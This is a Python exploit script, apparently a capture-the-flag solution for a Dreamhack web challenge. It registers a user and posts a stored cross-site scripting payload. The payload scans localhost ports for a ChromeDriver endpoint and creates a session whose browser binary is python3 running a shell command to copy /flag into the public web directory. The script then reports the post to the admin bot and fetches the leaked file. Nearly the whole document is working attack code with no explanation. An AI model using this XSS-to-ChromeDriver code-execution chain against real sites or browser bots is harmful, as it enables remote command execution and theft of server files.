import requests
import time
import re

url = 'http://host3.dreamhack.games:12751/'
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked',
}

res = s.post(f'{url}/register', data=creds)
res = s.post(f'{url}/login', data=creds)

assert 'post list' in res.text.lower()
print("> Logged in")

# chromedriver rce
leak_file = 'leak.txt'
cmd = 'cat /flag'

payload = '''
<script>
    const options = {
        mode: "no-cors",
        method: "POST",
        headers: {  
            'Content-Type': 'text/plain'  
        },
        body: JSON.stringify({
            capabilities: {
            alwaysMatch: {
                "goog:chromeOptions": {
                    binary: "/usr/bin/python3",
                        args: ["-cimport os; os.system('%s > /app/public/%s')"]
                    }
                }
            }
        })
    };

    ;(async () => {
        const batchSize = 200;
        
        for (let start = 32768; start < 61000; start += batchSize) {
            const batch = [];
            
            for (let port = start; port < Math.min(start + batchSize, 61000); port++) {
                batch.push(fetch(`http://127.0.0.1:${port}/session`, options).catch(() => {}))
            }
            
            await Promise.all(batch);
        }
    })()
</script>
'''.strip() % (cmd, leak_file,)

res = s.post(f"{url}/write", data={
    'title': 'hacked',
    'content': payload
})

path = re.findall(r'(/posts/[0-9]+)', res.url)[0].strip()
path = f'http://localhost:3000{path}'

print("> Payload path:", path)

# report
res = s.post(f'{url}/report', data={
    'url': path
})

assert 'queued' in res.text.lower()
print("> Reported payload")

# get leak
print("> Waiting...")
time.sleep(10)

res = s.get(f'{url}/static/{leak_file}')

print("Flag:", res.text.strip())